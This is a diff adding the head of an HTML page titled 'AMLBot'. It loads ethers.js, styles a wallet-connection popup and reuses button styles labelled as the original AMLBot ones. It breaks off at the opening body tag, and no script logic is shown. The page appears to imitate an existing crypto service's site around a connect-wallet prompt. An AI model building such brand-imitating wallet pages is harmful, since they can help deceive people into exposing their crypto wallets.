@@ -1,0 +1,874 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>AMLBot</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;display=swap" rel="stylesheet">
+  <style>
+    * {
+      scroll-behavior: smooth;
+    }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
+      background: linear-gradient(180deg, #ffffff 0%, #f8fafc 50%, #f1f5f9 100%);
+      position: relative;
+    }
+    
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        radial-gradient(circle at 20% 50%, rgba(59, 130, 246, 0.03) 0%, transparent 50%),
+        radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.03) 0%, transparent 50%),
+        radial-gradient(circle at 40% 20%, rgba(16, 185, 129, 0.03) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Wallet Connection Modal Styles */
+    .wallet-popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+    }
+
+    .wallet-popup-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .wallet-popup-content {
+      background: white;
+      border-radius: 24px;
+      width: 100%;
+      max-width: 440px;
+      max-height: 85vh;
+      overflow-y: auto;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
+      transform: scale(0.95) translateY(20px);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+    }
+    
+    .wallet-popup-content::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    .wallet-popup-content::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 10px;
+    }
+    
+    .wallet-popup-content::-webkit-scrollbar-thumb {
+      background: #888;
+      border-radius: 10px;
+    }
+    
+    .wallet-popup-content::-webkit-scrollbar-thumb:hover {
+      background: #555;
+    }
+
+    .wallet-popup-overlay.show .wallet-popup-content {
+      transform: scale(1) translateY(0);
+    }
+
+    .wallet-popup-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 24px;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .wallet-popup-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #000;
+      margin: 0;
+      flex: 1;
+      text-align: center;
+    }
+
+    .wallet-popup-close {
+      background: none;
+      border: none;
+      color: #6b7280;
+      font-size: 1.5rem;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .wallet-popup-close:hover {
+      background-color: #f3f4f6;
+      color: #374151;
+    }
+
+    .wallet-popup-body {
+      padding: 16px 24px 24px;
+    }
+
+    .wallet-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .wallet-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #f9fafb;
+      border: 2px solid #e5e7eb;
+      border-radius: 16px;
+      padding: 16px 20px;
+      cursor: pointer;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+    }
+
+    .wallet-option:hover {
+      background: #eff6ff;
+      border-color: #3b82f6;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
+    }
+    
+    .wallet-option:active {
+      transform: translateY(0);
+    }
+
+    .wallet-option.connecting {
+      background: #dbeafe;
+      border-color: #3b82f6;
+    }
+
+    .wallet-option.connected {
+      background: #dcfce7;
+      border-color: #16a34a;
+    }
+
+    .wallet-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      position: relative;
+    }
+
+    .wallet-option img {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      flex-shrink: 0;
+    }
+
+    .wallet-name {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #000;
+      margin: 0;
+    }
+
+    .wallet-badge {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #3b82f6;
+      background: #dbeafe;
+      padding: 4px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+
+    .connecting-spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #e5e7eb;
+      border-top: 2px solid #3b82f6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Original AMLBot Button Styles */
+    .LmFXKJ {
+      align-items: center;
+      background: linear-gradient(90deg, #0047FF 0%, #0066FF 100%);
+      border: none;
+      border-radius: 9999px;
+      color: #fff;
+      cursor: pointer;
+      display: inline-flex;
+      font-size: 1.125rem;
+      font-weight: 700;
+      gap: 0.75rem;
+      justify-content: center;
+      line-height: 1.5rem;
+      padding: 1rem 2rem;
+      text-decoration: none;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 10px 40px rgba(0, 71, 255, 0.3);
+    }
+
+    .LmFXKJ:hover {
+      box-shadow: 0 20px 60px rgba(0, 71, 255, 0.4);
+      transform: translateY(-2px);
+    }
+
+    .LmFXKJ .icon {
+      width: 1.375rem;
+      height: 1.375rem;
+      fill: currentColor;
+    }
+
+    .DyRl8I {
+      color: #4b5563;
+      font-weight: 600;
+      text-decoration: none;
+      transition: color 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .DyRl8I:hover {
+      color: #0047FF;
+    }
+
+    .DyRl8I .icon {
+      width: 1.25rem;
+      height: 0.625rem;
+      fill: currentColor;
+    }
+  </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.sticky{position:sticky}.inset-0{inset:0px}.top-0{top:0px}.left-1\/2{left:50%}.bottom-8{bottom:2rem}.right-8{right:2rem}.z-50{z-index:50}.z-10{z-index:10}.z-40{z-index:40}.mx-4{margin-left:1rem;margin-right:1rem}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-6{margin-bottom:1.5rem}.mt-6{margin-top:1.5rem}.mt-8{margin-top:2rem}.mb-12{margin-bottom:3rem}.mb-3{margin-bottom:0.75rem}.mb-4{margin-bottom:1rem}.ml-2{margin-left:0.5rem}.mr-2{margin-right:0.5rem}.mr-3{margin-right:0.75rem}.mt-1{margin-top:0.25rem}.mt-auto{margin-top:auto}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-24{height:6rem}.h-6{height:1.5rem}.h-12{height:3rem}.h-16{height:4rem}.h-7{height:1.75rem}.h-auto{height:auto}.min-h-screen{min-height:100vh}.w-28{width:7rem}.w-6{width:1.5rem}.w-full{width:100%}.w-12{width:3rem}.w-16{width:4rem}.w-7{width:1.75rem}.max-w-2xl{max-width:42rem}.max-w-4xl{max-width:56rem}.max-w-md{max-width:28rem}.max-w-xs{max-width:20rem}.max-w-3xl{max-width:48rem}.max-w-7xl{max-width:80rem}.flex-grow{flex-grow:1}.-translate-x-1\/2{--tw-translate-x:-50%;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.transform{transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.select-none{-webkit-user-select:none;user-select:none}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-6{gap:1.5rem}.space-x-2 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(0.5rem * var(--tw-space-x-reverse));margin-left:calc(0.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-6 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem * var(--tw-space-x-reverse));margin-left:calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.space-y-6 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.rounded-full{border-radius:9999px}.rounded-2xl{border-radius:1rem}.rounded-lg{border-radius:0.5rem}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-gray-100{--tw-border-opacity:1;border-color:rgb(243 244 246 / var(--tw-border-opacity, 1))}.border-green-100{--tw-border-opacity:1;border-color:rgb(220 252 231 / var(--tw-border-opacity, 1))}.border-red-100{--tw-border-opacity:1;border-color:rgb(254 226 226 / var(--tw-border-opacity, 1))}.border-yellow-100{--tw-border-opacity:1;border-color:rgb(254 249 195 / var(--tw-border-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-white\/80{background-color:rgb(255 255 255 / 0.8)}.bg-opacity-90{--tw-bg-opacity:0.9}.bg-gradient-to-r{background-image:linear-gradient(to right, var(--tw-gradient-stops))}.bg-\[radial-gradient\(circle_at_30\%_50\%\2c rgba\(59\2c 130\2c 246\2c 0\.05\)\2c transparent_50\%\)\]{background-image:radial-gradient(circle at 30% 50%,rgba(59,130,246,0.05),transparent 50%)}.bg-\[radial-gradient\(circle_at_70\%_50\%\2c rgba\(139\2c 92\2c 246\2c 0\.05\)\2c transparent_50\%\)\]{background-image:radial-gradient(circle at 70% 50%,rgba(139,92,246,0.05),transparent 50%)}.bg-gradient-to-b{background-image:linear-gradient(to bottom, var(--tw-gradient-stops))}.bg-gradient-to-br{background-image:linear-gradient(to bottom right, var(--tw-gradient-stops))}.from-gray-900{--tw-gradient-from:#111827 var(--tw-gradient-from-position);--tw-gradient-to:rgb(17 24 39 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-\[\#0047FF\]{--tw-gradient-from:#0047FF var(--tw-gradient-from-position);--tw-gradient-to:rgb(0 71 255 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-blue-100{--tw-gradient-from:#dbeafe var(--tw-gradient-from-position);--tw-gradient-to:rgb(219 234 254 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-green-100{--tw-gradient-from:#dcfce7 var(--tw-gradient-from-position);--tw-gradient-to:rgb(220 252 231 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-green-500{--tw-gradient-from:#22c55e var(--tw-gradient-from-position);--tw-gradient-to:rgb(34 197 94 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-red-100{--tw-gradient-from:#fee2e2 var(--tw-gradient-from-position);--tw-gradient-to:rgb(254 226 226 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-red-500{--tw-gradient-from:#ef4444 var(--tw-gradient-from-position);--tw-gradient-to:rgb(239 68 68 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-slate-50{--tw-gradient-from:#f8fafc var(--tw-gradient-from-position);--tw-gradient-to:rgb(248 250 252 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-white{--tw-gradient-from:#fff var(--tw-gradient-from-position);--tw-gradient-to:rgb(255 255 255 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-yellow-500{--tw-gradient-from:#eab308 var(--tw-gradient-from-position);--tw-gradient-to:rgb(234 179 8 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.via-blue-900{--tw-gradient-to:rgb(30 58 138 / 0)  var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), #1e3a8a var(--tw-gradient-via-position), var(--tw-gradient-to)}.via-gray-50{--tw-gradient-to:rgb(249 250 251 / 0)  var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), #f9fafb var(--tw-gradient-via-position), var(--tw-gradient-to)}.via-white{--tw-gradient-to:rgb(255 255 255 / 0)  var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), #fff var(--tw-gradient-via-position), var(--tw-gradient-to)}.to-gray-900{--tw-gradient-to:#111827 var(--tw-gradient-to-position)}.to-\[\#0066FF\]{--tw-gradient-to:#0066FF var(--tw-gradient-to-position)}.to-blue-50{--tw-gradient-to:#eff6ff var(--tw-gradient-to-position)}.to-emerald-600{--tw-gradient-to:#059669 var(--tw-gradient-to-position)}.to-green-50{--tw-gradient-to:#f0fdf4 var(--tw-gradient-to-position)}.to-orange-500{--tw-gradient-to:#f97316 var(--tw-gradient-to-position)}.to-red-50{--tw-gradient-to:#fef2f2 var(--tw-gradient-to-position)}.to-red-600{--tw-gradient-to:#dc2626 var(--tw-gradient-to-position)}.to-white{--tw-gradient-to:#fff var(--tw-gradient-to-position)}.bg-clip-text{-webkit-background-clip:text;background-clip:text}.object-contain{object-fit:contain}.p-3{padding:0.75rem}.p-6{padding:1.5rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.py-8{padding-top:2rem;padding-bottom:2rem}.py-16{padding-top:4rem;padding-bottom:4rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-12{padding-top:3rem;padding-bottom:3rem}.text-left{text-align:left}.text-center{text-align:center}.text-4xl{font-size:2.25rem;line-height:2.5rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xs{font-size:0.75rem;line-height:1rem}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.font-extrabold{font-weight:800}.font-semibold{font-weight:600}.font-bold{font-weight:700}.leading-relaxed{line-height:1.625}.leading-tight{line-height:1.25}.text-black{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-transparent{color:transparent}.text-blue-500{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity, 1))}.text-blue-600{--tw-text-opacity:1;color:rgb(37 99 235 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-green-500{--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity, 1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-yellow-600{--tw-text-opacity:1;color:rgb(202 138 4 / var(--tw-text-opacity, 1))}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgb(0 0 0 / 0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-black\/5{--tw-shadow-color:rgb(0 0 0 / 0.05);--tw-shadow:var(--tw-shadow-colored)}.shadow-blue-500\/40{--tw-shadow-color:rgb(59 130 246 / 0.4);--tw-shadow:var(--tw-shadow-colored)}.shadow-green-500\/30{--tw-shadow-color:rgb(34 197 94 / 0.3);--tw-shadow:var(--tw-shadow-colored)}.shadow-red-500\/30{--tw-shadow-color:rgb(239 68 68 / 0.3);--tw-shadow:var(--tw-shadow-colored)}.shadow-yellow-500\/30{--tw-shadow-color:rgb(234 179 8 / 0.3);--tw-shadow:var(--tw-shadow-colored)}.drop-shadow-xl{--tw-drop-shadow:drop-shadow(0 20px 13px rgb(0 0 0 / 0.03)) drop-shadow(0 8px 5px rgb(0 0 0 / 0.08));filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)}.backdrop-blur-xl{--tw-backdrop-blur:blur(24px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.backdrop-blur-sm{--tw-backdrop-blur:blur(4px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-transform{transition-property:transform;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-300{transition-duration:300ms}.duration-200{transition-duration:200ms}.hover\:-translate-y-2:hover{--tw-translate-y:-0.5rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.hover\:scale-110:hover{--tw-scale-x:1.1;--tw-scale-y:1.1;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.hover\:border-green-200:hover{--tw-border-opacity:1;border-color:rgb(187 247 208 / var(--tw-border-opacity, 1))}.hover\:border-red-200:hover{--tw-border-opacity:1;border-color:rgb(254 202 202 / var(--tw-border-opacity, 1))}.hover\:border-yellow-200:hover{--tw-border-opacity:1;border-color:rgb(254 240 138 / var(--tw-border-opacity, 1))}.hover\:bg-green-50:hover{--tw-bg-opacity:1;background-color:rgb(240 253 244 / var(--tw-bg-opacity, 1))}.hover\:bg-red-50:hover{--tw-bg-opacity:1;background-color:rgb(254 242 242 / var(--tw-bg-opacity, 1))}.hover\:bg-yellow-50:hover{--tw-bg-opacity:1;background-color:rgb(254 252 232 / var(--tw-bg-opacity, 1))}.hover\:shadow-xl:hover{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.hover\:shadow-blue-500\/60:hover{--tw-shadow-color:rgb(59 130 246 / 0.6);--tw-shadow:var(--tw-shadow-colored)}.hover\:shadow-green-200\/50:hover{--tw-shadow-color:rgb(187 247 208 / 0.5);--tw-shadow:var(--tw-shadow-colored)}.hover\:shadow-red-200\/50:hover{--tw-shadow-color:rgb(254 202 202 / 0.5);--tw-shadow:var(--tw-shadow-colored)}.hover\:shadow-yellow-200\/50:hover{--tw-shadow-color:rgb(254 240 138 / 0.5);--tw-shadow:var(--tw-shadow-colored)}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.group:hover .group-hover\:scale-110{--tw-scale-x:1.1;--tw-scale-y:1.1;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}@media (min-width: 640px){.sm\:mx-6{margin-left:1.5rem;margin-right:1.5rem}.sm\:px-8{padding-left:2rem;padding-right:2rem}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:py-12{padding-top:3rem;padding-bottom:3rem}.sm\:text-5xl{font-size:3rem;line-height:1}.sm\:text-lg{font-size:1.125rem;line-height:1.75rem}.sm\:text-4xl{font-size:2.25rem;line-height:2.5rem}}@media (min-width: 768px){.md\:grid-cols-3{grid-template-columns:repeat(3, minmax(0, 1fr))}}@media (min-width: 1024px){.lg\:mx-8{margin-left:2rem;margin-right:2rem}.lg\:grid-cols-3{grid-template-columns:repeat(3, minmax(0, 1fr))}.lg\:gap-8{gap:2rem}.lg\:px-8{padding-left:2rem;padding-right:2rem}.lg\:py-16{padding-top:4rem;padding-bottom:4rem}.lg\:text-6xl{font-size:3.75rem;line-height:1}}</style><style type="text/css">* {user-select: auto !important; -webkit-user-select: auto !important;}</style><input type="hidden" id="inject_idm_text_selection"></head>
+<body class="min-h-screen flex flex-col relative">
